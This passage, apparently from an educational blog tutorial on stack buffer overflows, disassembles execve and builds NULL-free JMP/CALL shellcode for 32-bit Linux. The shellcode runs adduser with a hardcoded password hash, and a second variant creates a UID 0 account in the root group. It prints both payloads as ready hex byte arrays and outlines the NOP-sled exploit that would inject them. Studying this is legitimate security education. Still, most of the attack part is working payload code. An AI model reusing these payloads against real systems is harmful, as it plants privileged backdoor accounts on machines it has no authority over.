+Therefore, it also makes sense to place the pointers of our string literals directly one after the other on the stack. This makes it possible to iterate through the list of pointers without any problems and to read in the individual arguments successively. The null pointer name[4] is used as an end identifier for the pointer list.
+The following is the assembler code of the execve() function: <!--- _*__ ** --></p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">__execve</span><span class="o">:</span>
+<span class="mi">1</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>			
+<span class="mi">2</span>	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>		
+<span class="mi">3</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>		
+<span class="mi">4</span>	<span class="k">test</span>   <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>		
+<span class="mi">5</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">edi</span>			
+<span class="mi">6</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebx</span>			
+<span class="mi">7</span>	<span class="k">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">edi</span>		
+<span class="mi">8</span>	<span class="k">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="n">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span>
+<span class="mi">9</span>	<span class="k">call</span>   <span class="mh">0x0</span>			
+<span class="mi">10</span>	<span class="k">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">ecx</span>		
+<span class="mi">11</span>	<span class="k">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>		
+<span class="mi">12</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebx</span>			
+<span class="mi">13</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">edi</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>		
+<span class="mi">14</span>	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>		
+<span class="mi">15</span>	<span class="k">int</span>    <span class="err">$</span><span class="mh">0x80</span>			
+<span class="mi">16</span>	<span class="k">pop</span>    <span class="err">%</span><span class="n">ebx</span>			
+<span class="mi">17</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>		
+<span class="mi">18</span>	<span class="k">cmp</span>    <span class="err">$</span><span class="mh">0xfffff000</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>
+<span class="mi">19</span>	<span class="k">jbe</span>    <span class="mh">0x804caff</span> <span class="o">&lt;</span><span class="n">__execve</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
+<span class="mi">20</span>	<span class="k">neg</span>    <span class="err">%</span><span class="n">ebx</span>
+<span class="mi">21</span>	<span class="k">call</span>   <span class="mh">0x80484bc</span> <span class="o">&lt;</span><span class="n">__errno_location</span><span class="o">&gt;</span>
+<span class="mi">22</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">ebx</span><span class="p">,(</span><span class="err">%</span><span class="n">eax</span><span class="p">)</span>
+<span class="mi">23</span>	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0xffffffff</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>
+<span class="mi">24</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">ebx</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
+<span class="mi">25</span>	<span class="k">pop</span>    <span class="err">%</span><span class="n">ebx</span>
+<span class="mi">26</span>	<span class="k">pop</span>    <span class="err">%</span><span class="n">edi</span>
+<span class="mi">27</span>	<span class="k">pop</span>    <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">28</span>	<span class="k">ret</span></code></pre></figure>
+<p><!--- _*__ ** --></p>
+
+<p>The first lines are almost identical to the main function:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>			
+<span class="mi">2</span>	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>		
+<span class="mi">3</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>		
+<span class="mi">4</span>	<span class="k">test</span>   <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span></code></pre></figure>
+<p><!--- _*__ ** -->
+In line two, the EAX register is set to zero and a TEST instruction with this register is executed in line four. This command causes a bitwise AND operation without modifying the operands. Only the corresponding flags in the status register are set or deleted. In this case, as we will see below, only the fact that the zero flag is set is of interest.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">5</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">edi</span>			
+<span class="mi">6</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebx</span>			
+<span class="mi">7</span>	<span class="k">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">edi</span></code></pre></figure>
+<p><!--- _*__ ** -->
+The registers EDI and EBX are then saved to the stack. The instruction in line seven loads the pointer name[0] into the register EDI.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8</span>	<span class="k">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="n">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span></code></pre></figure>
+<p><!--- _*__ ** -->
+If the zero-flag is set, the system branches to line eight. This is, as already mentioned, always the case. The program flow is therefore always continued in line ten.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">10</span>	<span class="k">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">ecx</span>		
+<span class="mi">11</span>	<span class="k">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>		
+<span class="mi">12</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebx</span></code></pre></figure>
+<p><!--- _*__ ** -->
+The instructions in line ten or eleven cause the third parameter with the value NULL to be copied to EDX and the pointer name to ECX. Afterwards the EBX register is saved on the stack again (it doesn’t seem to make much sense).</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">13</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">edi</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>		
+<span class="mi">14</span>	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>		
+<span class="mi">15</span>	<span class="k">int</span>    <span class="err">$</span><span class="mh">0x80</span></code></pre></figure>
+<p><!--- _*__ ** -->
+Before a software interrupt is triggered in line 15, the registers EBX and EAX are set to the value 0xb and to the pointer name[0]. As can be seen from the “System Call Table” of our Linux system, the value 0xb (11) corresponds exactly to the system call “sys_execve” provided by the operating system.
+The remaining lines 16 - 28 are not considered further, since they are only executed in the event of an error in the system call. We will introduce a simple error handling later.</p>
+
+<p>Apparently, all arguments to the system call were stored in different registers. In fact, for system calls with fewer than 6 parameters, the arguments are all stored in the EBX, ECX, EDX, ESI and EDI registers in turn. The number of the desired call is always stored in the register EAX and the return value of the system call is also written back to EAX. In our case, the registers are described as follows:
+EAX:	11 (No. of system-call execve)
+EBX:	name[0]
+ECX:	name
+EDX: 	NULL</p>
+
+<p>If we compare this with the call
+	execve (name[0], name, NULL),
+the assignment of the registers also makes sense, the order of the parameters was kept.</p>
+
+<h2 id="development-of-an-own-assembler-program">Development of an own Assembler Program</h2>
+<p>After this detailed analysis of the generated assembler code, a much more compact code can now be written. There are, however, two points to be discussed first:
+Above, we have determined that the string literals are stored in the data segment of the process. If executable code is to be introduced into the target system, we can only use the available input buffer. The strings must therefore be placed directly behind the executable code. Due to the JMP/CALL construction described earlier, the addresses of the individual strings can be easily determined later on.
+Also, a suitable error handling in case of a system call failure is not yet available. At this point only the simplest possible treatment should be considered: The current process should be terminated cleanly with an <code class="highlighter-rouge">exit()</code> - Syscall. Only a status code is expected as an argument. The number in the syscall table is 1. The following assembler code can fulfill this functionality:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">	<span class="n">movl</span> <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span> <span class="err">%</span><span class="n">eax</span>
+	<span class="n">movl</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="err">%</span><span class="n">ebx</span>
+	<span class="k">int</span> <span class="err">$</span><span class="mh">0x80</span></code></pre></figure>
+<p><!--- _*__ ** -->
+Below is a brief summary of the steps required to create a working code to corrupt the target system:</p>
+<ol>
+  <li>Correct placement of strings after the actual code</li>
+  <li>Determine the individual string addresses and place them in a suitable place</li>
+  <li>Storing a NULL pointer (directly behind the string addresses)</li>
+  <li>Null termination of the individual strings (not done automatically!!)</li>
+  <li>Setting the four registers EAX up to EDX</li>
+  <li>Triggering a software interrupt</li>
+  <li>Error handling
+The code should have the following structure:</li>
+</ol>
+
+<p><img src="/images/2018-02-05-buffer-overflows/examplestructure.png" alt="" class="image-center" width="600px" /></p>
+
+<p>Some initial runnable code might look like this:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">jmp</span> <span class="n">data</span>
+<span class="n">start</span><span class="o">:</span>
+	<span class="n">popl</span> <span class="err">%</span><span class="n">esi</span>             <span class="err">#</span> <span class="n">Base</span> <span class="n">Address</span> <span class="n">der</span> <span class="n">Strings</span> <span class="n">vom</span> <span class="n">Stack</span> <span class="n">holen</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[0]</span> 		
+	<span class="n">leal</span> <span class="mi">18</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[1]</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>			
+	<span class="n">leal</span> <span class="mi">25</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[2]</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>		
+	<span class="n">leal</span> <span class="mi">28</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[3]</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>		
+	<span class="n">movb</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="n">Termination</span> <span class="n">of</span> <span class="n">the</span> <span class="n">Strings</span>
+	<span class="n">movb</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>
+	<span class="n">movb</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>
+	<span class="n">movb</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>
+	<span class="n">movl</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x7D</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>  <span class="err">#</span> <span class="n">NULL</span><span class="o">-</span><span class="n">Pointer</span> <span class="n">at</span> <span class="n">end</span> <span class="n">of</span> <span class="n">pointer</span> <span class="n">list</span>
+	<span class="n">movl</span> <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>        <span class="err">#</span> <span class="n">Code</span> <span class="n">of</span> <span class="n">SysCall</span><span class="o">-</span><span class="n">table</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">esi</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>        <span class="err">#</span> <span class="n">Address</span> <span class="n">of</span> <span class="n">name</span><span class="p">[0]</span>
+	<span class="n">leal</span> <span class="mi">63</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">ecx</span>    <span class="err">#</span> <span class="n">Address</span> <span class="p">[A]</span> <span class="n">to</span> <span class="n">ECX</span> <span class="p">(</span><span class="n">name</span><span class="p">[])</span>
+	<span class="n">leal</span> <span class="mh">0x7D</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>  <span class="err">#</span> <span class="n">Address</span> <span class="n">of</span> <span class="n">null</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">EDX</span>
+	<span class="k">int</span> <span class="err">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="n">Trigger</span> <span class="n">Interrupt</span>
+	<span class="n">movl</span> <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>        <span class="err">#</span> <span class="n">Begin</span> <span class="n">of</span> <span class="n">Error</span> <span class="n">Handling</span>
+	<span class="n">movl</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>
+	<span class="k">int</span> <span class="err">$</span><span class="mh">0x80</span>
+<span class="n">data</span><span class="o">:</span>
+	<span class="k">call</span> <span class="n">start</span>            <span class="err">#</span> <span class="n">Put</span> <span class="n">base</span> <span class="n">address</span> <span class="n">of</span> <span class="n">Strings</span> <span class="n">on</span> <span class="n">the</span> <span class="n">Stack</span>
+<span class="p">.</span><span class="n">string</span> <span class="err">\</span><span class="s">"/usr/sbin/adduser#markus#-p#$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0#</span><span class="se">\"</span></code></pre></figure>
+<p><!--- _*__ ** --></p>
+
+<p>When placing the strings, make sure that one byte is needed for the end identifier at the end of each string. In this case “#” was used as placeholder.<br />
+When testing this code, however, it is noticeable that the C function <code class="highlighter-rouge">strcpy()</code> does not copy the complete code into the overflow buffer. A reason for this observation can be found quickly:
+Since there are NULL bytes in the code, but <code class="highlighter-rouge">strcpy()</code> aborts the copy process exactly when a NULL byte is reached, the entire code cannot be copied into the buffer. Due to this fact, the code is useless in principle. Therefore, all NULL bytes must be removed first. However, since the strings require a termination byte, a different approach must be found. An important relation of Boolean algebra helps here:</p>
+
+<script type="math/tex; mode=display">x \nleftrightarrow x = 0</script>
+
+<p>Therefore, a register can be set to zero with a simple XOR operation and then written to the corresponding memory locations. This changes the code as follows:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">jmp</span> <span class="n">data</span>
+<span class="n">start</span><span class="o">:</span>
+	<span class="n">popl</span> <span class="err">%</span><span class="n">esi</span>             <span class="err">#</span> <span class="n">Base</span> <span class="n">Address</span> <span class="n">der</span> <span class="n">Strings</span> <span class="n">vom</span> <span class="n">Stack</span> <span class="n">holen</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[0]</span> 		
+	<span class="n">leal</span> <span class="mi">18</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[1]</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>			
+	<span class="n">leal</span> <span class="mi">25</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[2]</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>		
+	<span class="n">leal</span> <span class="mi">28</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">for</span> <span class="n">name</span><span class="p">[3]</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>
+	<span class="n">xorl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>        <span class="err">#</span> <span class="n">Null</span> <span class="n">the</span> <span class="n">EAX</span> <span class="n">register</span>		
+	<span class="n">movb</span> <span class="err">%</span><span class="n">al</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>     <span class="err">#</span> <span class="n">Termination</span> <span class="n">of</span> <span class="n">the</span> <span class="n">Strings</span> <span class="p">(</span><span class="n">one</span> <span class="n">byte</span> <span class="n">each</span><span class="p">)</span>
+	<span class="n">movb</span> <span class="err">%</span><span class="n">al</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>
+	<span class="n">movb</span> <span class="err">%</span><span class="n">al</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>
+	<span class="n">movb</span> <span class="err">%</span><span class="n">al</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">79</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="n">NULL</span><span class="o">-</span><span class="n">Pointer</span> <span class="n">at</span> <span class="n">end</span> <span class="n">of</span> <span class="n">pointer</span> <span class="n">list</span>
+	<span class="n">movb</span> <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="err">%</span><span class="n">al</span>         <span class="err">#</span> <span class="n">Code</span> <span class="n">of</span> <span class="n">SysCall</span><span class="o">-</span><span class="n">table</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">esi</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>        <span class="err">#</span> <span class="n">Address</span> <span class="n">of</span> <span class="n">name</span><span class="p">[0]</span>
+	<span class="n">leal</span> <span class="mi">63</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">ecx</span>    <span class="err">#</span> <span class="n">Address</span> <span class="p">[A]</span> <span class="n">to</span> <span class="n">ECX</span> <span class="p">(</span><span class="n">name</span><span class="p">[])</span>
+	<span class="n">leal</span> <span class="mi">79</span><span class="p">(</span><span class="err">%</span><span class="n">esi</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>    <span class="err">#</span> <span class="n">Address</span> <span class="n">of</span> <span class="n">null</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">EDX</span>
+	<span class="k">int</span> <span class="err">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="n">Trigger</span> <span class="n">Interrupt</span>
+	<span class="n">xorl</span> <span class="err">%</span><span class="n">ebx</span><span class="p">,</span><span class="err">%</span><span class="n">ebx</span>	      <span class="err">#</span> <span class="n">Begin</span> <span class="n">of</span> <span class="n">Error</span> <span class="n">Handling</span>
+	<span class="n">movl</span> <span class="err">%</span><span class="n">ebx</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
+	<span class="k">inc</span> <span class="err">%</span><span class="n">eax</span>
+	<span class="k">int</span> <span class="err">$</span><span class="mh">0x80</span>
+<span class="n">data</span><span class="o">:</span>
+	<span class="k">call</span> <span class="n">start</span>            <span class="err">#</span> <span class="n">Put</span> <span class="n">base</span> <span class="n">address</span> <span class="n">of</span> <span class="n">Strings</span> <span class="n">on</span> <span class="n">the</span> <span class="n">Stack</span>
+<span class="p">.</span><span class="n">string</span> <span class="err">\</span><span class="s">"/usr/sbin/adduser#markus#-p#$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0#</span><span class="se">\"</span></code></pre></figure>
+<p><!--- _*__ ** --></p>
+
+<h2 id="assembling-the-program-and-extracting-the-machine-code">Assembling the program and extracting the machine code</h2>
+<p>After assembly, the machine code can be read out using the GDB debugger. This should be used next to create an exploit. The size of the code is exactly 128 bytes.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
+	<span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span></code></pre></figure>
+<p><!--- _*__ ** --></p>
+
+<h2 id="creating-a-fully-functional-exploit">Creating a fully functional exploit</h2>
+<p>The goal of the exploit is to cause the buffer to overflow in the faulty program, but to fill the overflow buffer as effectively as possible. The size of the overflow buffer is 512 bytes, the size of the code to be executed is exactly 128 bytes. Therefore, there are still more than 384 bytes left, which should be appropriately occupied. In this example it is therefore particularly useful to use NOP-sliding. In addition, the assumed address of the payload is required to successfully overwrite the function’s return address. The structure of the exploit could look like this:</p>
+
+<p>Since the payload address can only be approximated roughly, the NOPs region should be slightly larger to increase the probability of successful execution. The C-program for generating the exploit is not to be considered here, a detailed commented source code can be found on GitHub.
+The previous shellcode can until now “only” create a user “markus” without special rights. In order to create a user with root privileges, an extended parameter list for the program “useradd” is necessary. However, the basic structure of the shell code can be retained. For this reason, we do not want to go into any further details, but simply list the code here:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="err">`</span><span class="n">main</span><span class="p">()</span><span class="err">`</span> <span class="p">{</span>
+   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="s">"-u"</span><span class="p">;</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0"</span><span class="p">;</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-g"</span><span class="p">;</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s">"root"</span><span class="p">;</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span>
+   <span class="n">name</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0;</span><span class="err">
+</span><span class="s">   name[7] = "</span><span class="n">rut</span><span class="s">";</span><span class="err">
+</span><span class="s">   name[8] = NULL;</span><span class="err">
+</span><span class="s">   execve(name[0], name, NULL);</span><span class="err">
+</span><span class="s">}</span></code></pre></figure>
+<p><!--- _*__ ** -->
+which leads to the following machine code:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">char</span> <span class="n">byteCode</span><span class="p">[]</span> <span class="o">=</span>
+	<span class="s">"</span><span class="se">\xeb\x67\x5e\x89\x76\x4c\x8d\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x12\x89\x46\x50\x8d\x46\x15\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x54\x8d\x46\x17\x89\x46\x58</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x8d\x46\x1a\x89\x46\x5c\x8d\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x1d\x89\x46\x60\x8d\x46\x22\x89</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x64\x8d\x46\x25\x89\x46\x68</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x8d\x46\x48\x89\x46\x6c\x31\xc0</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x88\x46\x11\x88\x46\x14\x88\x46</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x16\x88\x46\x19\x88\x46\x1c\x88</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x46\x21\x88\x46\x24\x88\x46\x47</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x88\x46\x4b\x89\x46\x70\xb0\x0b</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x89\xf3\x8d\x4e\x4c\x8d\x56\x70</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x80\xe8\x94\xff\xff\xff\x2f\x75</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x73\x72\x2f\x73\x62\x69\x6e\x2f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x61\x64\x64\x75\x73\x65\x72\x23</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x2d\x75\x23\x30\x23\x2d\x6f\x23</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x2d\x67\x23\x72\x6f\x6f\x74\x23</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x2d\x70\x23\x24\x31\x24\x37\xcf</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x76\xd9\x4c\x4b\xcf\xb5\x24\x67</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x53\x55\x4b\x47\x36\x52\x41\x4c</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x7a\x52\x41\x38\x72\x79\x52\x4f</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x63\x54\x73\x47\x30\x23\x72\x75</span><span class="s">"</span>
+	<span class="s">"</span><span class="se">\x74\x23</span><span class="s">"</span><span class="c">;</span></code></pre></figure>
+<p><!--- _*__ ** --></p>
+
+<h1 id="appendix">Appendix</h1>
+
+<h2 id="example-for-off-by-ones-overflows">Example for Off-By-Ones Overflows</h2>
+
